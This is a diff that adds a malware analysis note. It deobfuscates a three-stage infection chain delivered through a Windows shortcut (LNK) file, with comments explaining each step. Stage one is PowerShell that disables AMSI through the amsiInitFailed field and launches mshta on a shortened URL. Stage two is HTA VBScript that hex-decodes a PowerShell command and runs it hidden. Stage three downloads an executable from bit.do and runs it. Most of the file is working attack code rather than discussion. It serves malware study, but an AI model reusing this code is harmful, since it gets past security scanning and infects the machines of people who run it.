@@ -1,0 +1,81 @@
+Mlink_Lnk_deobfuscated: -----------------------------------------------------------|
+
+Possible reference: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
+
+1st stage: Powershell_payload_embedded_in_Lnk :
+
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy UnRestricted -WindowStyle 1 $oc='KCTSMMGNGEZAHHSBKMICDFGROJGRBULIULPBIHCWUTRABGGXTZNFKLIDIWHBLRGFNXUNXMXOSCUIBLRJIGVMMRTPTVBSARIBWSFVZZOFHVRSWTBDOEUVKGLSSVSKQVVBMNYESUGZWLXRFXVBJHMJNAZJAUAELAXVGOOLXNMLQGAACZOMVBWNWJANUIYWPKIKPZRQCDCHHFHIVWCUDXAHDKBCSUQUWJVRHIFKZGCUEOHLEWIULAWNDXNZYHHYI';
+function iexqggwq($ji)
+{
+    $og=[Text.StringBuilder]::New();
+    $ys=12;
+    for($ll=0;$ll -lt $ji.Length;$ll+=2){   # For_loop $ll = 0,2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42
+        $xz=-join($ji.Substring($ll,2)[1,0]);
+        [void]$og.Append([char]([System.Convert]::ToUInt16($xz,16)+$ys));
+    };
+return $og.ToString();
+};
+$bj=iexqggwq '74D6768695162214552655B595169526862253968636165586D5362622531676D59486D50676'; # $bj = "System.Management.Automation.AmsiUtils";
+$rc=iexqggwq '551676D5D326D586A355D5069585'; # $rc = "amsiInitFailed";
+$ox=iexqggwq '24362644966506D5750274865586D575'; #ox = "NonPublic,Static";
+try{[Ref].Assembly.GetType($bj).GetField($rc,$ox).SetValue($Null,$True)}catch{};;
+$df='TYEHSSRHTLUTJNDMCADS';
+sal wta ($df[15,4,3,0,17] -join(''));   # set-alias wta mshta , $df[15,4,3,0,17] = mshta
+$hj=iexqggwq 'C586864676E23232063626B52255A5329646D6867506'; #hj = "https://long.af/upytcl";
+wta $hj;
+
+
+
+2nd stage: hta_embedded_vbscript : -------------------------------------------------------------------------|
+
+
+' Hex to Ascii convert_function
+Function scvmefoyo(khzgbevury)  
+	Dim gxsefhv : gxsefhv = Split(khzgbevury)
+	Dim vuatj
+	For vuatj = 0 To UBound(gxsefhv)
+		gxsefhv(vuatj) = Chr("&H" & gxsefhv(vuatj))
+	Next
+	scvmefoyo = Join(gxsefhv, "")
+End Function
+
+Function wkgsrjxiz()
+	Dim lyrfmibd
+	Dim ntjte
+	Dim rwnriz
+	lyrfmibd = "70 6F 77 65 72 73 68 65 6C 6C 2E 65 78 65 20 2D 45 78 65 63 75 74 69 6F 6E 50 6F 6C 69 63 79 20 55 6E 52 65 73 74 72 69 63 74 65 64 20 24 66 71 61 72 67 62 75 69 20 3D 20 24 4E 75 6C 6C 3B 66 75 6E 63 74 69 6F 6E 20 6F 6A 6B 75 65 75 75 6A 28 24 78 67 73 7A 62 67 29 7B 72 65 74 75 72 6E 20 2D 6A 6F 69 6E 28 24 78 67 73 7A 62 67 2D 73 70 6C 69 74 27 28 2E 2E 29 27 7C 3F 20 4C 2A 68 7C 25 7B 5B 63 68 61 72 5D 2B 28 27 30 78 27 2B 24 5F 29 7D 29 7D 3B 66 75 6E 63 74 69 6F 6E 20 6B 70 63 73 6E 68 6A 28 24 64 66 6B 79 73 67 6D 2C 20 24 66 76 73 69 6A 6C 70 74 29 7B 24 71 61 6A 6D 65 20 3D 20 40 28 27 54 4C 53 31 32 27 2C 20 27 54 4C 53 31 31 27 2C 20 27 54 4C 53 27 2C 20 27 53 53 4C 33 27 29 3B 24 69 63 66 78 66 61 20 3D 20 24 65 6E 76 3A 50 55 42 4C 49 43 2B 28 6F 6A 6B 75 65 75 75 6A 28 27 35 43 27 29 29 2B 24 66 76 73 69 6A 6C 70 74 3B 24 61 63 6B 73 6C 6E 20 3D 20 4E 65 77 2D 4F 62 6A 65 63 74 20 28 6F 6A 6B 75 65 75 75 6A 28 27 34 45 36 35 37 34 32 45 35 37 36 35 36 32 34 33 36 43 36 39 36 35 36 45 37 34 27 29 29 3B 66 6F 72 65 61 63 68 28 24 76 68 77 65 70 6E 65 20 69 6E 20 24 71 61 6A 6D 65 29 7B 74 72 79 7B 5B 4E 65 74 2E 53 65 72 76 69 63 65 50 6F 69 6E 74 4D 61 6E 61 67 65 72 5D 3A 3A 53 65 63 75 72 69 74 79 50 72 6F 74 6F 63 6F 6C 20 3D 20 5B 4E 65 74 2E 53 65 63 75 72 69 74 79 50 72 6F 74 6F 63 6F 6C 54 79 70 65 5D 3A 3A 24 76 68 77 65 70 6E 65 3B 24 63 6C 61 73 6E 79 6A 20 3D 20 24 61 63 6B 73 6C 6E 2E 44 6F 77 6E 6C 6F 61 64 44 61 74 61 28 24 64 66 6B 79 73 67 6D 29 3B 62 72 65 61 6B 3B 7D 63 61 74 63 68 7B 7D 3B 7D 3B 5B 49 4F 2E 46 69 6C 65 5D 3A 3A 57 72 69 74 65 41 6C 6C 42 79 74 65 73 28 24 69 63 66 78 66 61 2C 20 24 63 6C 61 73 6E 79 6A 29 3B 53 74 61 72 74 2D 50 72 6F 63 65 73 73 20 2D 46 69 6C 65 50 61 74 68 20 24 69 63 66 78 66 61 20 2D 50 61 73 73 54 68 72 75 7D 3B 24 64 66 6B 79 73 67 6D 20 3D 20 6F 6A 6B 75 65 75 75 6A 28 27 44 45 43 4F 59 5F 55 52 4C 27 29 3B 24 66 76 73 69 6A 6C 70 74 20 3D 20 53 70 6C 69 74 2D 50 61 74 68 20 24 64 66 6B 79 73 67 6D 20 2D 4C 65 61 66 3B 6B 70 63 73 6E 68 6A 20 24 64 66 6B 79 73 67 6D 20 24 66 76 73 69 6A 6C 70 74 3B 24 64 66 6B 79 73 67 6D 20 3D 20 6F 6A 6B 75 65 75 75 6A 28 27 36 38 37 34 37 34 37 30 33 41 32 46 32 46 36 32 36 39 37 34 32 45 36 34 36 46 32 46 36 36 34 44 36 44 34 43 37 33 27 29 3B 24 66 76 73 69 6A 6C 70 74 20 3D 20 6F 6A 6B 75 65 75 75 6A 28 27 36 36 34 44 36 44 34 43 37 33 32 45 36 35 37 38 36 35 27 29 3B 24 69 63 66 78 66 61 20 3D 20 24 65 6E 76 3A 50 55 42 4C 49 43 2B 28 6F 6A 6B 75 65 75 75 6A 28 27 35 43 27 29 29 2B 24 66 76 73 69 6A 6C 70 74 3B 20 6B 70 63 73 6E 68 6A 20 24 64 66 6B 79 73 67 6D 20 24 66 76 73 69 6A 6C 70 74 3B"
+	ntjte = scvmefoyo(lyrfmibd)
+	Set rwnriz = CreateObject(scvmefoyo("57 73 63 72 69 70 74 2e 53 68 65 6c 6c"))  ' Wscript.Shell
+	rwnriz.Run(ntjte),0,true
+	self.close()
+End Function
+
+
+
+
+
+3rd stage : Powershell_payload : --------------------------------------------------------------------------------------|
+
+
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy UnRestricted ;
+function ojkueuuj($xgszbg){
+    return -join($xgszbg-split'(..)'|? L*h|%{[char]+('0x'+$_)})  # convert hex to ascii
+};
+function kpcsnhj($download_link, $fvsijlpt){
+    $qajme = @('TLS12', 'TLS11', 'TLS', 'SSL3');
+    $path = $env:PUBLIC+(ojkueuuj('5C'))+$fvsijlpt; # \
+    $acksln = New-Object (ojkueuuj('4E65742E576562436C69656E74')); #Net.webclient
+    foreach($vhwepne in $qajme){
+        try{
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::$vhwepne;
+            $clasnyj = $acksln.DownloadData($download_link);break;
+        }
+        catch{};
+    };
+    [IO.File]::WriteAllBytes($path, $clasnyj);
+    Start-Process -FilePath $path -PassThru
+};
+$download_link = ojkueuuj('687474703A2F2F6269742E646F2F664D6D4C73'); # http://bit.do/fMmLs
+$fvsijlpt = ojkueuuj('664D6D4C732E657865'); # fMmLs.exe
+$path = $env:PUBLIC+(ojkueuuj('5C'))+$fvsijlpt; # \
+ kpcsnhj $download_link $fvsijlpt;
